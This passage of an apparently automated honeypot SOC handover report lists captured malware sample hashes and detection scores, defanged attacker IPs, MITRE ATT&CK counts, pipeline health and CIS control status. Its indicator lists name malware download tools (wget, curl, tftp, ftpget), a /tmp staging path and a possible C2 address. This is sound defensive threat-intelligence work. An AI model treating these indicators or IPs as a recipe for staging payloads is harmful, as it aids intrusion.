| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **25/75** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `3eab3901798ec748895b2dca4b8762aec553d2966112999c60061d4599b599a0` | ELF Binary (Linux executable) (x86 32-bit) | `3eab3901798ec748...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `65.181.79[.]60` | HK | PCCW IMS Ltd (PCCW Business Internet Access) | **100** ⚠️ | 50 |
| `59.98.41[.]27` | IN | Broadband Multiplay Project, O/o DGM BB, NOC BSNL Bangalore | **100** ⚠️ | 8 |
| `217.154.106[.]153` | ES | IONOS SE | **100** ⚠️ | 50 |
| `61.12.86[.]90` | IN | TTSL-ISP DIVISION | **100** ⚠️ | 50 |
| `45.79.5[.]11` | US | Linode | **100** ⚠️ | 50 |
| `210.0.90[.]81` | AU | AAPT Limited | **100** ⚠️ | 50 |
| `121.66.63[.]186` | KR | LG Uplus | **100** ⚠️ | 50 |
| `182.73.164[.]228` | IN | KALINGA MEDIA & ENTERTAINMENT PVT. LTD. | **100** ⚠️ | 50 |
| `194.165.16[.]123` | LT | Flyservers S.A. | **100** ⚠️ | 5 |
| `78.187.9[.]111` | TR | Turk Telekomunikasyon Anonim Sirketi | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 125 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 119 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 50 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 50 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 49 |

---

## 🔕 False Positive Summary (14 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 12 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 181 cases |
| Tool 34  | Credential Extractor        | ✅ 142 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 14 fingerprints |
| Tool 36  | Command Clustering          | ✅ 5 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 66 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 14 filtered (7.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 51 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 24 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 119 priority case(s) shown individually · 27 recon entry/entries in table (12 group(s) consolidating 33 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-01T15:04:27Z_
